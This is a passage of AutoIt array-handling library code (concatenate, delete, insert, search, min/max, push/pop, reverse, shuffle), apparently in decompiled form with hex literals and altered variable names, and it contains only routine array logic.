        If $sdelimiter <> '' Then $aresult[$icount] = StringTrimRight($aresult[$icount], 0x1)
        $icount += 0x1
    WEnd
    Return $aresult
EndFunc    ; -> _ArrayCombinations

Func _ArrayConcatenate(ByRef $aarraytarget, Const ByRef $AARRAYSOURCE, $ISTART = 0x0)
    If $ISTART = Default Then $ISTART = 0x0
    If Not IsArray($aarraytarget) Then Return SetError(0x1, 0x0, + -1)
    If Not IsArray($AARRAYSOURCE) Then Return SetError(0x2, 0x0, + -1)
    Local $idim_total_tgt = UBound($aarraytarget, $UBOUND_DIMENSIONS)
    Local $idim_total_src = UBound($AARRAYSOURCE, $UBOUND_DIMENSIONS)
    Local $idim_1_tgt = UBound($aarraytarget, $UBOUND_ROWS)
    Local $idim_1_src = UBound($AARRAYSOURCE, $UBOUND_ROWS)
    If $ISTART < 0x0 Or $ISTART > $idim_1_src + -1 Then Return SetError(0x6, 0x0, + -1)
    Switch $idim_total_tgt
    Case 0x1
        If $idim_total_src <> 0x1 Then Return SetError(0x4, 0x0, + -1)
        ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $ISTART]
        For $i = $ISTART To $idim_1_src + -1
            $aarraytarget[$idim_1_tgt + $i - $ISTART] = $AARRAYSOURCE[$i]
        Next
    Case 0x2
        If $idim_total_src <> 0x2 Then Return SetError(0x4, 0x0, + -1)
        Local $idim_2_tgt = UBound($aarraytarget, $UBOUND_COLUMNS)
        If UBound($AARRAYSOURCE, $UBOUND_COLUMNS) <> $idim_2_tgt Then Return SetError(0x5, 0x0, + -1)
        ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $ISTART][$idim_2_tgt]
        For $i = $ISTART To $idim_1_src + -1
            For $j = 0x0 To $idim_2_tgt + -1
                $aarraytarget[$idim_1_tgt + $i - $ISTART][$j] = $AARRAYSOURCE[$i][$j]
            Next
        Next
    Case Else
        Return SetError(0x3, 0x0, + -1)
    EndSwitch
    Return UBound($aarraytarget, $UBOUND_ROWS)
EndFunc    ; -> _ArrayConcatenate

Func _ArrayDelete(ByRef $AARRAY, $vrange)
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    If IsArray($vrange) Then
        If UBound($vrange, $UBOUND_DIMENSIONS) <> 0x1 Or UBound($vrange, $UBOUND_ROWS) < 0x2 Then Return SetError(0x4, 0x0, + -1)
    Else
        Local $inumber, $asplit_1, $asplit_2
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ''
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\\d+(-\\d+)?$") Then Return SetError(0x3, 0x0, + -1)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
            Case 0x1
                $vrange &= $asplit_2[0x1] & ";"
            Case 0x2
                If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                    $inumber = $asplit_2[0x1] + -1
                    Do
                        $inumber += 0x1
                        $vrange &= $inumber & ";"
                    Until $inumber = $asplit_2[0x2]
                EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    For $i = 0x1 To $vrange[0x0]
        $vrange[$i] = Number($vrange[$i])
    Next
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, + -1)
    Local $icopyto_index = 0x0
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        For $i = 0x1 To $vrange[0x0]
            $AARRAY[$vrange[$i]] = ChrW(0xfab1)
        Next
        For $ireadfrom_index = 0x0 To $idim_1
            If $AARRAY[$ireadfrom_index] == ChrW(0xfab1) Then
                ContinueLoop
            Else
                If $ireadfrom_index <> $icopyto_index Then
                    $AARRAY[$icopyto_index] = $AARRAY[$ireadfrom_index]
                EndIf
                $icopyto_index += 0x1
            EndIf
        Next
        ReDim $AARRAY[$idim_1 - $vrange[0x0] + 0x1]
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        For $i = 0x1 To $vrange[0x0]
            $AARRAY[$vrange[$i]][0x0] = ChrW(0xfab1)
        Next
        For $ireadfrom_index = 0x0 To $idim_1
            If $AARRAY[$ireadfrom_index][0x0] == ChrW(0xfab1) Then
                ContinueLoop
            Else
                If $ireadfrom_index <> $icopyto_index Then
                    For $j = 0x0 To $idim_2
                        $AARRAY[$icopyto_index][$j] = $AARRAY[$ireadfrom_index][$j]
                    Next
                EndIf
                $icopyto_index += 0x1
            EndIf
        Next
        ReDim $AARRAY[$idim_1 - $vrange[0x0] + 0x1][$idim_2 + 0x1]
    Case Else
        Return SetError(0x2, 0x0, False)
    EndSwitch
    Return UBound($AARRAY, $UBOUND_ROWS)
EndFunc    ; -> _ArrayDelete

Func _ArrayDisplay(Const ByRef $AARRAY, $stitle = Default, $SARRAYRANGE = Default, $iflags = Default, $VUSER_SEPARATOR = Default, $SHEADER = Default, $IMAX_COLWIDTH = Default)
    #forceref $vUser_Separator
    Local $iret = __ArrayDisplay_Share($AARRAY, $stitle, $SARRAYRANGE, $iflags, Default, $SHEADER, $IMAX_COLWIDTH, 0x0, False)
    Return SetError(@error, @extended, $iret)
EndFunc    ; -> _ArrayDisplay

Func _ArrayExtract(Const ByRef $AARRAY, $ISTART_ROW = + -1, $IEND_ROW = + -1, $ISTART_COL = + -1, $IEND_COL = + -1)
    If $ISTART_ROW = Default Then $ISTART_ROW = + -1
    If $IEND_ROW = Default Then $IEND_ROW = + -1
    If $ISTART_COL = Default Then $ISTART_COL = + -1
    If $IEND_COL = Default Then $IEND_COL = + -1
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    If $IEND_ROW = + -1 Then $IEND_ROW = $idim_1
    If $ISTART_ROW = + -1 Then $ISTART_ROW = 0x0
    If $ISTART_ROW < + -1 Or $IEND_ROW < + -1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART_ROW > $idim_1 Or $IEND_ROW > $idim_1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART_ROW > $IEND_ROW Then Return SetError(0x4, 0x0, + -1)
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        Local $aretarray[$IEND_ROW - $ISTART_ROW + 0x1]
        For $i = 0x0 To $IEND_ROW - $ISTART_ROW
            $aretarray[$i] = $AARRAY[$i + $ISTART_ROW]
        Next
        Return $aretarray
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        If $IEND_COL = + -1 Then $IEND_COL = $idim_2
        If $ISTART_COL = + -1 Then $ISTART_COL = 0x0
        If $ISTART_COL < + -1 Or $IEND_COL < + -1 Then Return SetError(0x5, 0x0, + -1)
        If $ISTART_COL > $idim_2 Or $IEND_COL > $idim_2 Then Return SetError(0x5, 0x0, + -1)
        If $ISTART_COL > $IEND_COL Then Return SetError(0x6, 0x0, + -1)
        If $ISTART_COL = $IEND_COL Then
            Local $aretarray[$IEND_ROW - $ISTART_ROW + 0x1]
        Else
            Local $aretarray[$IEND_ROW - $ISTART_ROW + 0x1][$IEND_COL - $ISTART_COL + 0x1]
        EndIf
        For $i = 0x0 To $IEND_ROW - $ISTART_ROW
            For $j = 0x0 To $IEND_COL - $ISTART_COL
                If $ISTART_COL = $IEND_COL Then
                    $aretarray[$i] = $AARRAY[$i + $ISTART_ROW][$j + $ISTART_COL]
                Else
                    $aretarray[$i][$j] = $AARRAY[$i + $ISTART_ROW][$j + $ISTART_COL]
                EndIf
            Next
        Next
        Return $aretarray
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArrayExtract

Func _ArrayFindAll(Const ByRef $AARRAY, $vvalue, $ISTART = 0x0, $IEND = 0x0, $ICASE = 0x0, $ICOMPARE = 0x0, $isubitem = 0x0, $BROW = False)
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $ICASE = Default Then $ICASE = 0x0
    If $ICOMPARE = Default Then $ICOMPARE = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If $BROW = Default Then $BROW = False
    $ISTART = _ArraySearch($AARRAY, $vvalue, $ISTART, $IEND, $ICASE, $ICOMPARE, 0x1, $isubitem, $BROW)
    If @error Then Return SetError(@error, 0x0, + -1)
    Local $iindex = 0x0, $avresult[UBound($AARRAY, ($BROW  ? $UBOUND_COLUMNS  : $UBOUND_ROWS))]
    Do
        $avresult[$iindex] = $ISTART
        $iindex += 0x1
        $ISTART = _ArraySearch($AARRAY, $vvalue, $ISTART + 0x1, $IEND, $ICASE, $ICOMPARE, 0x1, $isubitem, $BROW)
    Until @error
    ReDim $avresult[$iindex]
    Return $avresult
EndFunc    ; -> _ArrayFindAll

Func _arrayfromstring($sarraystr, $sdelim_col = "|", $sdelim_row = @CRLF, $bforce2d = False, $istripws = $STR_STRIPLEADING + $STR_STRIPTRAILING)
    If $sdelim_col = Default Then $sdelim_col = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $bforce2d = Default Then $bforce2d = False
    If $istripws = Default Then $istripws = $STR_STRIPLEADING + $STR_STRIPTRAILING
    Local $arow, $acol = StringSplit($sarraystr, $sdelim_row, $STR_ENTIRESPLIT + $STR_NOCOUNT)
    $arow = StringSplit($acol[0x0], $sdelim_col, $STR_ENTIRESPLIT + $STR_NOCOUNT)
    If UBound($acol) = 0x1 And Not $bforce2d Then
        For $m = 0x0 To UBound($arow) + -1
            $arow[$m] = ($istripws  ? StringStripWS($arow[$m], $istripws) : $arow[$m])
        Next
        Return $arow
    EndIf
    Local $aret[UBound($acol)][UBound($arow)]
    For $n = 0x0 To UBound($acol) + -1
        $arow = StringSplit($acol[$n], $sdelim_col, $STR_ENTIRESPLIT + $STR_NOCOUNT)
        If UBound($arow) > UBound($aret, 0x2) Then Return SetError(0x1)
        For $m = 0x0 To UBound($arow) + -1
            $aret[$n][$m] = ($istripws  ? StringStripWS($arow[$m], $istripws) : $arow[$m])
        Next
    Next
    Return $aret
EndFunc    ; -> _arrayfromstring

Func _ArrayInsert(ByRef $AARRAY, $vrange, $vvalue = '', $ISTART = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $ARRAYFILL_FORCE_DEFAULT)
    If $vvalue = Default Then $vvalue = ''
    If $ISTART = Default Then $ISTART = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $ARRAYFILL_FORCE_DEFAULT
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    Local $hdatatype = 0x0
    Switch $iforce
    Case $ARRAYFILL_FORCE_INT
        $hdatatype = Int
    Case $ARRAYFILL_FORCE_NUMBER
        $hdatatype = Number
    Case $ARRAYFILL_FORCE_PTR
        $hdatatype = Ptr
    Case $ARRAYFILL_FORCE_HWND
        $hdatatype = HWnd
    Case $ARRAYFILL_FORCE_STRING
        $hdatatype = String
    EndSwitch
    Local $asplit_1, $asplit_2
    If IsArray($vrange) Then
        If UBound($vrange, $UBOUND_DIMENSIONS) <> 0x1 Or UBound($vrange, $UBOUND_ROWS) < 0x2 Then Return SetError(0x4, 0x0, + -1)
    Else
        Local $inumber
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ''
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\\d+(-\\d+)?$") Then Return SetError(0x3, 0x0, + -1)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
            Case 0x1
                $vrange &= $asplit_2[0x1] & ";"
            Case 0x2
                If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                    $inumber = $asplit_2[0x1] + -1
                    Do
                        $inumber += 0x1
                        $vrange &= $inumber & ";"
                    Until $inumber = $asplit_2[0x2]
                EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    For $i = 0x1 To $vrange[0x0]
        $vrange[$i] = Number($vrange[$i])
    Next
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, + -1)
    For $i = 0x2 To $vrange[0x0]
        If $vrange[$i] < $vrange[$i + -1] Then Return SetError(0x3, 0x0, + -1)
    Next
    Local $icopyto_index = $idim_1 + $vrange[0x0]
    Local $iinsertpoint_index = $vrange[0x0]
    Local $iinsert_index = $vrange[$iinsertpoint_index]
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $iforce = $ARRAYFILL_FORCE_SINGLEITEM Then
            ReDim $AARRAY[$idim_1 + $vrange[0x0] + 0x1]
            For $ireadfromindex = $idim_1 To 0x0 Step + -1
                $AARRAY[$icopyto_index] = $AARRAY[$ireadfromindex]
                $icopyto_index -= 0x1
                $iinsert_index = $vrange[$iinsertpoint_index]
                While $ireadfromindex = $iinsert_index
                    $AARRAY[$icopyto_index] = $vvalue
                    $icopyto_index -= 0x1
                    $iinsertpoint_index -= 0x1
                    If $iinsertpoint_index < 0x1 Then ExitLoop 0x2
                    $iinsert_index = $vrange[$iinsertpoint_index]
                WEnd
            Next
            Return $idim_1 + $vrange[0x0] + 0x1
        EndIf
        ReDim $AARRAY[$idim_1 + $vrange[0x0] + 0x1]
        If IsArray($vvalue) Then
            If UBound($vvalue, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x5, 0x0, + -1)
            $hdatatype = 0x0
        Else
            Local $atmp = StringSplit($vvalue, $sdelim_item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
            If UBound($atmp, $UBOUND_ROWS) = 0x1 Then
                $atmp[0x0] = $vvalue
                $hdatatype = 0x0
            EndIf
            $vvalue = $atmp
        EndIf
        For $ireadfromindex = $idim_1 To 0x0 Step + -1
            $AARRAY[$icopyto_index] = $AARRAY[$ireadfromindex]
            $icopyto_index -= 0x1
            $iinsert_index = $vrange[$iinsertpoint_index]
            While $ireadfromindex = $iinsert_index
                If $iinsertpoint_index <= UBound($vvalue, $UBOUND_ROWS) Then
                    If IsFunc($hdatatype) Then
                        $AARRAY[$icopyto_index] = $hdatatype($vvalue[$iinsertpoint_index + -1])
                    Else
                        $AARRAY[$icopyto_index] = $vvalue[$iinsertpoint_index + -1]
                    EndIf
                Else
                    $AARRAY[$icopyto_index] = ''
                EndIf
                $icopyto_index -= 0x1
                $iinsertpoint_index -= 0x1
                If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                $iinsert_index = $vrange[$iinsertpoint_index]
            WEnd
        Next
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS)
        If $ISTART < 0x0 Or $ISTART > $idim_2 + -1 Then Return SetError(0x6, 0x0, + -1)
        Local $ivaldim_1, $ivaldim_2
        If IsArray($vvalue) Then
            If UBound($vvalue, $UBOUND_DIMENSIONS) <> 0x2 Then Return SetError(0x7, 0x0, + -1)
            $ivaldim_1 = UBound($vvalue, $UBOUND_ROWS)
            $ivaldim_2 = UBound($vvalue, $UBOUND_COLUMNS)
            $hdatatype = 0x0
        Else
            $asplit_1 = StringSplit($vvalue, $sdelim_row, $STR_NOCOUNT + $STR_ENTIRESPLIT)
            $ivaldim_1 = UBound($asplit_1, $UBOUND_ROWS)
            StringReplace($asplit_1[0x0], $sdelim_item, '')
            $ivaldim_2 = @extended + 0x1
            Local $atmp[$ivaldim_1][$ivaldim_2]
            For $i = 0x0 To $ivaldim_1 + -1
                $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
                For $j = 0x0 To $ivaldim_2 + -1
                    $atmp[$i][$j] = $asplit_2[$j]
                Next
            Next
            $vvalue = $atmp
        EndIf
        If UBound($vvalue, $UBOUND_COLUMNS) + $ISTART > UBound($AARRAY, $UBOUND_COLUMNS) Then Return SetError(0x8, 0x0, + -1)
        ReDim $AARRAY[$idim_1 + $vrange[0x0] + 0x1][$idim_2]
        For $ireadfromindex = $idim_1 To 0x0 Step + -1
            For $j = 0x0 To $idim_2 + -1
                $AARRAY[$icopyto_index][$j] = $AARRAY[$ireadfromindex][$j]
            Next
            $icopyto_index -= 0x1
            $iinsert_index = $vrange[$iinsertpoint_index]
            While $ireadfromindex = $iinsert_index
                For $j = 0x0 To $idim_2 + -1
                    If $j < $ISTART Then
                        $AARRAY[$icopyto_index][$j] = ''
                    ElseIf $j - $ISTART > $ivaldim_2 + -1 Then
                        $AARRAY[$icopyto_index][$j] = ''
                    Else
                        If $iinsertpoint_index + -1 < $ivaldim_1 Then
                            If IsFunc($hdatatype) Then
                                $AARRAY[$icopyto_index][$j] = $hdatatype($vvalue[$iinsertpoint_index + -1][$j - $ISTART])
                            Else
                                $AARRAY[$icopyto_index][$j] = $vvalue[$iinsertpoint_index + -1][$j - $ISTART]
                            EndIf
                        Else
                            $AARRAY[$icopyto_index][$j] = ''
                        EndIf
                    EndIf
                Next
                $icopyto_index -= 0x1
                $iinsertpoint_index -= 0x1
                If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                $iinsert_index = $vrange[$iinsertpoint_index]
            WEnd
        Next
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return UBound($AARRAY, $UBOUND_ROWS)
EndFunc    ; -> _ArrayInsert

Func _ArrayMax(Const ByRef $AARRAY, $ICOMPNUMERIC = 0x0, $ISTART = + -1, $IEND = + -1, $isubitem = 0x0)
    Local $iresult = _ArrayMaxIndex($AARRAY, $ICOMPNUMERIC, $ISTART, $IEND, $isubitem)
    If @error Then Return SetError(@error, 0x0, '')
    If UBound($AARRAY, $UBOUND_DIMENSIONS) = 0x1 Then
        Return $AARRAY[$iresult]
    Else
        Return $AARRAY[$iresult][$isubitem]
    EndIf
EndFunc    ; -> _ArrayMax

Func _ArrayMaxIndex(Const ByRef $AARRAY, $ICOMPNUMERIC = 0x0, $ISTART = + -1, $IEND = + -1, $isubitem = 0x0)
    If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0x0
    If $ISTART = Default Then $ISTART = + -1
    If $IEND = Default Then $IEND = + -1
    If $isubitem = Default Then $isubitem = 0x0
    Local $iret = __Array_MinMaxIndex($AARRAY, $ICOMPNUMERIC, $ISTART, $IEND, $isubitem, __Array_GreaterThan)
    Return SetError(@error, 0x0, $iret)
EndFunc    ; -> _ArrayMaxIndex

Func _ArrayMin(Const ByRef $AARRAY, $ICOMPNUMERIC = 0x0, $ISTART = + -1, $IEND = + -1, $isubitem = 0x0)
    Local $iresult = _ArrayMinIndex($AARRAY, $ICOMPNUMERIC, $ISTART, $IEND, $isubitem)
    If @error Then Return SetError(@error, 0x0, '')
    If UBound($AARRAY, $UBOUND_DIMENSIONS) = 0x1 Then
        Return $AARRAY[$iresult]
    Else
        Return $AARRAY[$iresult][$isubitem]
    EndIf
EndFunc    ; -> _ArrayMin

Func _ArrayMinIndex(Const ByRef $AARRAY, $ICOMPNUMERIC = 0x0, $ISTART = + -1, $IEND = + -1, $isubitem = 0x0)
    If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0x0
    If $ISTART = Default Then $ISTART = + -1
    If $IEND = Default Then $IEND = + -1
    If $isubitem = Default Then $isubitem = 0x0
    Local $iret = __Array_MinMaxIndex($AARRAY, $ICOMPNUMERIC, $ISTART, $IEND, $isubitem, __Array_LessThan)
    Return SetError(@error, 0x0, $iret)
EndFunc    ; -> _ArrayMinIndex

Func _ArrayPermute(ByRef $AARRAY, $sdelimiter = '')
    If $sdelimiter = Default Then $sdelimiter = ''
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x2, 0x0, 0x0)
    Local $isize = UBound($AARRAY), $ifactorial = 0x1, $aidx[$isize], $aresult[0x1], $icount = 0x1
    If UBound($AARRAY) Then
        For $i = 0x0 To $isize + -1
            $aidx[$i] = $i
        Next
        For $i = $isize To 0x1 Step + -1
            $ifactorial *= $i
        Next
        ReDim $aresult[$ifactorial + 0x1]
        $aresult[0x0] = $ifactorial
        __Array_ExeterInternal($AARRAY, 0x0, $isize, $sdelimiter, $aidx, $aresult, $icount)
    Else
        $aresult[0x0] = 0x0
    EndIf
    Return $aresult
EndFunc    ; -> _ArrayPermute

Func _ArrayPop(ByRef $AARRAY)
    If (Not IsArray($AARRAY)) Then Return SetError(0x1, 0x0, '')
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x2, 0x0, '')
    Local $iubound = UBound($AARRAY) + -1
    If $iubound = + -1 Then Return SetError(0x3, 0x0, '')
    Local $slastval = $AARRAY[$iubound]
    If $iubound > + -1 Then
        ReDim $AARRAY[$iubound]
    EndIf
    Return $slastval
EndFunc    ; -> _ArrayPop

Func _ArrayPush(ByRef $AARRAY, $vvalue, $idirection = 0x0)
    If $idirection = Default Then $idirection = 0x0
    If (Not IsArray($AARRAY)) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x3, 0x0, 0x0)
    Local $iubound = UBound($AARRAY) + -1
    If IsArray($vvalue) Then
        Local $iubounds = UBound($vvalue)
        If ($iubounds + -1) > $iubound Then Return SetError(0x2, 0x0, 0x0)
        If $idirection Then
            For $i = $iubound To $iubounds Step + -1
                $AARRAY[$i] = $AARRAY[$i - $iubounds]
            Next
            For $i = 0x0 To $iubounds + -1
                $AARRAY[$i] = $vvalue[$i]
            Next
        Else
            For $i = 0x0 To $iubound - $iubounds
                $AARRAY[$i] = $AARRAY[$i + $iubounds]
            Next
            For $i = 0x0 To $iubounds + -1
                $AARRAY[$i + $iubound - $iubounds + 0x1] = $vvalue[$i]
            Next
        EndIf
    Else
        If $iubound > + -1 Then
            If $idirection Then
                For $i = $iubound To 0x1 Step + -1
                    $AARRAY[$i] = $AARRAY[$i + -1]
                Next
                $AARRAY[0x0] = $vvalue
            Else
                For $i = 0x0 To $iubound + -1
                    $AARRAY[$i] = $AARRAY[$i + 0x1]
                Next
                $AARRAY[$iubound] = $vvalue
            EndIf
        EndIf
    EndIf
    Return 0x1
EndFunc    ; -> _ArrayPush

Func _ArrayReverse(ByRef $AARRAY, $ISTART = 0x0, $IEND = 0x0)
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x3, 0x0, 0x0)
    If Not UBound($AARRAY) Then Return SetError(0x4, 0x0, 0x0)
    Local $vtmp, $iubound = UBound($AARRAY) + -1
    If $IEND < 0x1 Or $IEND > $iubound Then $IEND = $iubound
    If $ISTART < 0x0 Then $ISTART = 0x0
    If $ISTART > $IEND Then Return SetError(0x2, 0x0, 0x0)
    For $i = $ISTART To Int(($ISTART + $IEND + -1) / 0x2)
        $vtmp = $AARRAY[$i]
        $AARRAY[$i] = $AARRAY[$IEND]
        $AARRAY[$IEND] = $vtmp
        $IEND -= 0x1
    Next
    Return 0x1
EndFunc    ; -> _ArrayReverse

Func _ArraySearch(Const ByRef $AARRAY, $vvalue, $ISTART = 0x0, $IEND = 0x0, $ICASE = 0x0, $ICOMPARE = 0x0, $IFORWARD = 0x1, $isubitem = + -1, $BROW = False)
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $ICASE = Default Then $ICASE = 0x0
    If $ICOMPARE = Default Then $ICOMPARE = 0x0
    If $IFORWARD = Default Then $IFORWARD = 0x1
    If $isubitem = Default Then $isubitem = + -1
    If $BROW = Default Then $BROW = False
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY) + -1
    If $idim_1 = + -1 Then Return SetError(0x3, 0x0, + -1)
    Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
    Local $bcomptype = False
    If $ICOMPARE = 0x2 Then
        $ICOMPARE = 0x0
        $bcomptype = True
    EndIf
    If $BROW Then
        If UBound($AARRAY, $UBOUND_DIMENSIONS) = 0x1 Then Return SetError(0x5, 0x0, + -1)
        If $IEND < 0x1 Or $IEND > $idim_2 Then $IEND = $idim_2
        If $ISTART < 0x0 Then $ISTART = 0x0
        If $ISTART > $IEND Then Return SetError(0x4, 0x0, + -1)
    Else
        If $IEND < 0x1 Or $IEND > $idim_1 Then $IEND = $idim_1
        If $ISTART < 0x0 Then $ISTART = 0x0
        If $ISTART > $IEND Then Return SetError(0x4, 0x0, + -1)
    EndIf
    Local $istep = 0x1
    If Not $IFORWARD Then
        Local $itmp = $ISTART
        $ISTART = $IEND
        $IEND = $itmp
        $istep = + -1
    EndIf
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If Not $ICOMPARE Then
            If Not $ICASE Then
                For $i = $ISTART To $IEND Step $istep
                    If $bcomptype And VarGetType($AARRAY[$i]) <> VarGetType($vvalue) Then ContinueLoop
                    If $AARRAY[$i] = $vvalue Then Return $i
                Next
            Else
                For $i = $ISTART To $IEND Step $istep
                    If $bcomptype And VarGetType($AARRAY[$i]) <> VarGetType($vvalue) Then ContinueLoop
                    If $AARRAY[$i] == $vvalue Then Return $i
                Next
            EndIf
        Else
            For $i = $ISTART To $IEND Step $istep
                If $ICOMPARE = 0x3 Then
                    If StringRegExp($AARRAY[$i], $vvalue) Then Return $i
                Else
                    If StringInStr($AARRAY[$i], $vvalue, $ICASE) > 0x0 Then Return $i
                EndIf
            Next
        EndIf
    Case 0x2
        Local $idim_sub
        If $BROW Then
            $idim_sub = $idim_1
            If $isubitem > $idim_sub Then $isubitem = $idim_sub
            If $isubitem < 0x0 Then
                $isubitem = 0x0
            Else
                $idim_sub = $isubitem
            EndIf
        Else
            $idim_sub = $idim_2
            If $isubitem > $idim_sub Then $isubitem = $idim_sub
            If $isubitem < 0x0 Then
                $isubitem = 0x0
            Else
                $idim_sub = $isubitem
            EndIf
        EndIf
        For $j = $isubitem To $idim_sub
            If Not $ICOMPARE Then
                If Not $ICASE Then
                    For $i = $ISTART To $IEND Step $istep
                        If $BROW Then
                            If $bcomptype And VarGetType($AARRAY[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                            If $AARRAY[$j][$i] = $vvalue Then Return $i
                        Else
                            If $bcomptype And VarGetType($AARRAY[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                            If $AARRAY[$i][$j] = $vvalue Then Return $i
                        EndIf
                    Next
                Else
                    For $i = $ISTART To $IEND Step $istep
                        If $BROW Then
                            If $bcomptype And VarGetType($AARRAY[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                            If $AARRAY[$j][$i] == $vvalue Then Return $i
                        Else
                            If $bcomptype And VarGetType($AARRAY[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                            If $AARRAY[$i][$j] == $vvalue Then Return $i
                        EndIf
                    Next
                EndIf
            Else
                For $i = $ISTART To $IEND Step $istep
                    If $ICOMPARE = 0x3 Then
                        If $BROW Then
                            If StringRegExp($AARRAY[$j][$i], $vvalue) Then Return $i
                        Else
                            If StringRegExp($AARRAY[$i][$j], $vvalue) Then Return $i
                        EndIf
                    Else
                        If $BROW Then
                            If StringInStr($AARRAY[$j][$i], $vvalue, $ICASE) > 0x0 Then Return $i
                        Else
                            If StringInStr($AARRAY[$i][$j], $vvalue, $ICASE) > 0x0 Then Return $i
                        EndIf
                    EndIf
                Next
            EndIf
        Next
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return SetError(0x6, 0x0, + -1)
EndFunc    ; -> _ArraySearch

Func _ArrayShuffle(ByRef $AARRAY, $ISTART_ROW = 0x0, $IEND_ROW = 0x0, $icol = + -1)
    If $ISTART_ROW = Default Then $ISTART_ROW = 0x0
    If $IEND_ROW = Default Then $IEND_ROW = 0x0
    If $icol = Default Then $icol = + -1
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS)
    If $IEND_ROW = 0x0 Then $IEND_ROW = $idim_1 + -1
    If $ISTART_ROW < 0x0 Or $ISTART_ROW > $idim_1 + -1 Then Return SetError(0x3, 0x0, + -1)
    If $IEND_ROW < 0x1 Or $IEND_ROW > $idim_1 + -1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART_ROW > $IEND_ROW Then Return SetError(0x4, 0x0, + -1)
    Local $vtmp, $irand
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        For $i = $IEND_ROW To $ISTART_ROW + 0x1 Step + -1
            $irand = Random($ISTART_ROW, $i, 0x1)
            $vtmp = $AARRAY[$i]
            $AARRAY[$i] = $AARRAY[$irand]
            $AARRAY[$irand] = $vtmp
        Next
        Return 0x1
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS)
        If $icol < + -1 Or $icol > $idim_2 + -1 Then Return SetError(0x5, 0x0, + -1)
        Local $icol_start, $icol_end
        If $icol = + -1 Then
            $icol_start = 0x0
            $icol_end = $idim_2 + -1
        Else
            $icol_start = $icol
            $icol_end = $icol
        EndIf
        For $i = $IEND_ROW To $ISTART_ROW + 0x1 Step + -1
            $irand = Random($ISTART_ROW, $i, 0x1)
